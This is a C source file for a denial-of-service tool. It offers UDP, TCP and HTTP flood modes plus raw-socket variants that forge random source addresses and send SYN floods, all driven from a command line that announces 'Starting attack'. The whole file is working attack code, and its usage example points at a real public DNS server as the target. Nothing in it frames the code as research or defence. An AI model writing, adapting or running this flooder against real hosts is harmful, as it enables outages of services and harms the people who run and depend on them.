#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/types.h>
#include <netdb.h>

#define MAX_PACKET 65535
#define MAX_THREADS 500

volatile int attack_running = 1;
volatile unsigned long long packets_sent = 0;
volatile unsigned long long bytes_sent = 0;

typedef struct {
    char target[64];
    int port;
    int duration;
    int packet_size;
    int threads;
    int pps;
    int delay;
    char method[32];
} attack_args_t;

void random_payload(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() & 0xFF;
    }
}

uint32_t random_ip() {
    uint32_t ip;
    do {
        ip = (rand() & 0xFF) << 24 |
             (rand() & 0xFF) << 16 |
             (rand() & 0xFF) << 8 |
             (rand() & 0xFF);
    } while (ip == 0x0100007F || ip == 0x0A000000 || ip == 0xAC100000 || ip == 0xC0A80000);
    return ip;
}

unsigned short checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1) {
        sum += *(unsigned char *)buffer;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void *udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    char packet[MAX_PACKET];
    int packet_size;
    time_t end_time;
    int sent_count = 0;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return NULL;
    }

    int bufsize = 1024 * 1024 * 16;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    packet_size = args->packet_size;
    if (packet_size > 65507) packet_size = 65507;
    if (packet_size < 64) packet_size = 64;

    end_time = time(NULL) + args->duration;
    int delay_us = 1000000 / args->pps;
    if (delay_us < 1) delay_us = 1;

    while (attack_running && time(NULL) < end_time) {
        random_payload((unsigned char *)packet, packet_size);
        
        int result = sendto(sockfd, packet, packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        }

        if (args->threads > 1) {
            for (int i = 1; i < args->threads; i++) {
                random_payload((unsigned char *)packet, packet_size);
                result = sendto(sockfd, packet, packet_size, 0,
                               (struct sockaddr *)&target_addr, sizeof(target_addr));
                if (result > 0) {
                    packets_sent++;
                    bytes_sent += result;
                    sent_count++;
                }
            }
        }

        if (args->delay > 0) {
            usleep(args->delay);
        } else {
            usleep(delay_us);
        }
    }

    close(sockfd);
    return NULL;
}

void *tcp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    struct sockaddr_in target_addr;
    char packet[MAX_PACKET];
    int packet_size;
    time_t end_time;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        return NULL;
    }

    packet_size = args->packet_size;
    if (packet_size > 65535) packet_size = 65535;
    if (packet_size < 64) packet_size = 64;

    end_time = time(NULL) + args->duration;
    int delay_us = 1000000 / args->pps;
    if (delay_us < 1) delay_us = 1;

    while (attack_running && time(NULL) < end_time) {
        for (int i = 0; i < args->threads; i++) {
            int conn = socket(AF_INET, SOCK_STREAM, 0);
            if (conn >= 0) {
                fcntl(conn, F_SETFL, O_NONBLOCK);
                connect(conn, (struct sockaddr *)&target_addr, sizeof(target_addr));
                random_payload((unsigned char *)packet, packet_size);
                send(conn, packet, packet_size, MSG_NOSIGNAL);
                close(conn);
                packets_sent++;
                bytes_sent += packet_size;
            }
        }
        usleep(delay_us);
    }
    return NULL;
}

void *http_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    struct sockaddr_in target_addr;
    char http_request[4096];
    time_t end_time;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int delay_us = 1000000 / args->pps;
    if (delay_us < 1) delay_us = 1;

    while (attack_running && time(NULL) < end_time) {
        for (int i = 0; i < args->threads; i++) {
            snprintf(http_request, sizeof(http_request),
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n"
                "\r\n", args->target);
            
            int conn = socket(AF_INET, SOCK_STREAM, 0);
            if (conn >= 0) {
                fcntl(conn, F_SETFL, O_NONBLOCK);
                connect(conn, (struct sockaddr *)&target_addr, sizeof(target_addr));
                send(conn, http_request, strlen(http_request), MSG_NOSIGNAL);
                close(conn);
                packets_sent++;
                bytes_sent += strlen(http_request);
            }
        }
        usleep(delay_us);
    }
    return NULL;
}

void *udp_raw_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    unsigned char *payload;
    int packet_size;
    time_t end_time;
    int sent_count = 0;
    int error_count = 0;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sockfd);
        return NULL;
    }

    int bufsize = 1024 * 1024 * 16;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + args->packet_size;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int delay_us = 1000000 / args->pps;
    if (delay_us < 1) delay_us = 1;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
        payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        udp_header->source = htons(1024 + (rand() % 64511));
        udp_header->dest = htons(args->port);
        udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
        udp_header->check = 0;

        random_payload(payload, args->packet_size);
        ip_header->check = checksum((unsigned short *)packet, packet_size);

        int result = sendto(sockfd, packet, packet_size, 0,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        if (result > 0) {
            packets_sent++;
            bytes_sent += result;
            sent_count++;
        } else {
            error_count++;
            if (errno == EPERM || errno == EACCES) {
                close(sockfd);
                return NULL;
            }
        }

        if (args->threads > 1) {
            for (int i = 1; i < args->threads; i++) {
                ip_header = (struct iphdr *)packet;
                udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
                payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

                ip_header->ihl = 5;
                ip_header->version = 4;
                ip_header->tos = 0;
                ip_header->tot_len = htons(packet_size);
                ip_header->id = htons(rand() & 0xFFFF);
                ip_header->frag_off = 0;
                ip_header->ttl = 255;
                ip_header->protocol = IPPROTO_UDP;
                ip_header->check = 0;
                ip_header->saddr = random_ip();
                ip_header->daddr = target_addr.sin_addr.s_addr;

                udp_header->source = htons(1024 + (rand() % 64511));
                udp_header->dest = htons(args->port);
                udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
                udp_header->check = 0;

                random_payload(payload, args->packet_size);
                ip_header->check = checksum((unsigned short *)packet, packet_size);

                result = sendto(sockfd, packet, packet_size, 0,
                               (struct sockaddr *)&target_addr, sizeof(target_addr));
                if (result > 0) {
                    packets_sent++;
                    bytes_sent += result;
                    sent_count++;
                }
            }
        }

        if (args->delay > 0) {
            usleep(args->delay);
        } else {
            usleep(delay_us);
        }
    }

    close(sockfd);
    return NULL;
}

void *tcp_raw_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    int packet_size;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sockfd);
        return NULL;
    }

    int bufsize = 1024 * 1024 * 16;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int delay_us = 1000000 / args->pps;
    if (delay_us < 1) delay_us = 1;

    while (attack_running && time(NULL) < end_time) {
        for (int j = 0; j < args->threads; j++) {
            ip_header = (struct iphdr *)packet;
            tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));

            ip_header->ihl = 5;
            ip_header->version = 4;
            ip_header->tos = 0;
            ip_header->tot_len = htons(packet_size);
            ip_header->id = htons(rand() & 0xFFFF);
            ip_header->frag_off = 0;
            ip_header->ttl = 255;
            ip_header->protocol = IPPROTO_TCP;
            ip_header->check = 0;
            ip_header->saddr = random_ip();
            ip_header->daddr = target_addr.sin_addr.s_addr;

            tcp_header->source = htons(1024 + (rand() % 64511));
            tcp_header->dest = htons(args->port);
            tcp_header->seq = rand();
            tcp_header->ack_seq = 0;
            tcp_header->doff = 5;
            tcp_header->syn = 1;
            tcp_header->window = htons(65535);
            tcp_header->check = 0;
            tcp_header->urg_ptr = 0;

            ip_header->check = checksum((unsigned short *)packet, packet_size);

            sendto(sockfd, packet, packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr));
            packets_sent++;
            bytes_sent += packet_size;
        }
        usleep(delay_us);
    }

    close(sockfd);
    return NULL;
}

void *http_raw_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    char *payload;
    int packet_size;
    time_t end_time;
    char http_request[4096];

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sockfd);
        return NULL;
    }

    int bufsize = 1024 * 1024 * 16;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));

    memset(packet, 0, MAX_PACKET);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return NULL;
    }

    end_time = time(NULL) + args->duration;
    int delay_us = 1000000 / args->pps;
    if (delay_us < 1) delay_us = 1;

    while (attack_running && time(NULL) < end_time) {
        for (int j = 0; j < args->threads; j++) {
            snprintf(http_request, sizeof(http_request),
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n"
                "\r\n", args->target);
            
            int http_len = strlen(http_request);
            packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
            if (packet_size > MAX_PACKET) {
                packet_size = MAX_PACKET;
                http_len = packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
            }
            
            ip_header = (struct iphdr *)packet;
            tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
            payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));

            ip_header->ihl = 5;
            ip_header->version = 4;
            ip_header->tos = 0;
            ip_header->tot_len = htons(packet_size);
            ip_header->id = htons(rand() & 0xFFFF);
            ip_header->frag_off = 0;
            ip_header->ttl = 255;
            ip_header->protocol = IPPROTO_TCP;
            ip_header->check = 0;
            ip_header->saddr = random_ip();
            ip_header->daddr = target_addr.sin_addr.s_addr;

            tcp_header->source = htons(1024 + (rand() % 64511));
            tcp_header->dest = htons(args->port);
            tcp_header->seq = rand();
            tcp_header->ack_seq = 0;
            tcp_header->doff = 5;
            tcp_header->syn = 1;
            tcp_header->window = htons(65535);
            tcp_header->check = 0;
            tcp_header->urg_ptr = 0;

            memcpy(payload, http_request, http_len);
            ip_header->check = checksum((unsigned short *)packet, packet_size);

            sendto(sockfd, packet, packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr));
            packets_sent++;
            bytes_sent += packet_size;
        }
        usleep(delay_us);
    }

    close(sockfd);
    return NULL;
}

void print_stats() {
    printf("\rPackets: %llu | Bytes: %llu MB   ", packets_sent, bytes_sent / 1024 / 1024);
    fflush(stdout);
}

int main(int argc, char *argv[]) {
    if (argc < 6) {
        printf("Usage: %s <ip> <port> <time> <threads> <method> [pps] [size]\n", argv[0]);
        printf("Methods: udp, tcp, http, udp-raw, tcp-raw, http-raw\n");
        printf("Example: %s 8.8.8.8 80 60 100 udp 10000 1400\n", argv[0]);
        return 1;
    }

    signal(SIGPIPE, SIG_IGN);
    srand(time(NULL) ^ getpid());

    attack_args_t args;
    memset(&args, 0, sizeof(args));
    
    strcpy(args.target, argv[1]);
    args.port = atoi(argv[2]);
    args.duration = atoi(argv[3]);
    args.threads = atoi(argv[4]);
    strcpy(args.method, argv[5]);
    args.pps = (argc > 6) ? atoi(argv[6]) : 100000;
    args.packet_size = (argc > 7) ? atoi(argv[7]) : 1400;
    args.delay = 0;

    if (args.threads > MAX_THREADS) args.threads = MAX_THREADS;
    if (args.pps > 1000000) args.pps = 1000000;
    if (args.packet_size > 65507) args.packet_size = 65507;
    if (args.packet_size < 64) args.packet_size = 64;

    void *(*attack_func)(void *) = NULL;
    
    if (strcasecmp(args.method, "udp") == 0) {
        attack_func = udp_flood;
    } else if (strcasecmp(args.method, "tcp") == 0) {
        attack_func = tcp_flood;
    } else if (strcasecmp(args.method, "http") == 0) {
        attack_func = http_flood;
    } else if (strcasecmp(args.method, "udp-raw") == 0) {
        attack_func = udp_raw_flood;
    } else if (strcasecmp(args.method, "tcp-raw") == 0) {
        attack_func = tcp_raw_flood;
    } else if (strcasecmp(args.method, "http-raw") == 0) {
        attack_func = http_raw_flood;
    } else {
        printf("Invalid method: %s\n", args.method);
        printf("Available: udp, tcp, http, udp-raw, tcp-raw, http-raw\n");
        return 1;
    }

    printf("Starting attack:\n");
    printf("Target: %s:%d\n", args.target, args.port);
    printf("Duration: %d seconds\n", args.duration);
    printf("Threads: %d\n", args.threads);
    printf("Method: %s\n", args.method);
    printf("PPS: %d\n", args.pps);
    printf("Packet size: %d\n", args.packet_size);
    printf("Press Ctrl+C to stop\n\n");

    pthread_t attack_thread;
    if (pthread_create(&attack_thread, NULL, attack_func, &args) != 0) {
        printf("Failed to start attack\n");
        return 1;
    }

    pthread_detach(attack_thread);

    time_t start_time = time(NULL);
    while (attack_running) {
        sleep(1);
        print_stats();
        if (time(NULL) - start_time >= args.duration) {
            break;
        }
    }

    attack_running = 0;
    printf("\n\nAttack finished\n");
    print_stats();
    printf("\n");
    
    return 0;
}
